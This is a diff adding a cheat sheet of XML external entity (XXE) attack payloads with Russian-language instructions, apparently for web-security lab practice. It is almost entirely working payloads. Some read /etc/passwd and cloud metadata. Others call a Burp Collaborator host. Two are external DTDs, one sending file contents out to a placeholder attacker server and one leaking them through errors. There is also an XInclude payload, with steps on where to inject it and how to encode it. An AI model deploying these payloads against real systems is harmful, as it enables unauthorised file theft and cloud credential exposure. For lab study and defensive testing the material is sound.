@@ -1,0 +1,47 @@
+XXE
+
+%xxe;
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://abc123xyz.burpcollaborator.net/"> ]>	
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://abc123xyz.burpcollaborator.net/"> %xxe;]>
+
+===============================
+Создаем на своем внешнем сервере (или во вкладке Burp Collaborator / Exploit Server) файл со зловредным DTD (например, exploit.dtd):
+
+XML
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<![CDATA[<!ENTITY &#x25; exfil SYSTEM 'http://ВАШ_IP/?file=%file;'>]]>">
+%eval;
+%exfil;
+
+
+В основной уязвимый запрос на целевом сайте внедряем вызов нашего удаленного DTD:
+
+XML
+<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://ВАШ_СЕРВЕР/exploit.dtd"> %remote;]>
+
+===========================
+На внешнем сервере или в Exploit Server создаем зловредный DTD-файл (error.dtd):
+
+XML
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<![CDATA[<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>]]>">
+%eval;
+%exfil;
+Куда писать (в тело запроса на сайте):
+
+XML
+<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://ВАШ_СЕРВЕР/error.dtd"> %remote
+
+
+7. Exploiting XInclude to retrieve files
+Куда вставлять: Прямо в значение параметра productId в обычном URL-encoded POST-запросе (productId=...&storeId=1).
+
+XML
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+Важно: Если отправляете через Burp Suite, выделите весь этот пейлоад и нажмите Ctrl + U (или Cmd + U на Mac), чтобы закодировать его в URL-формат:
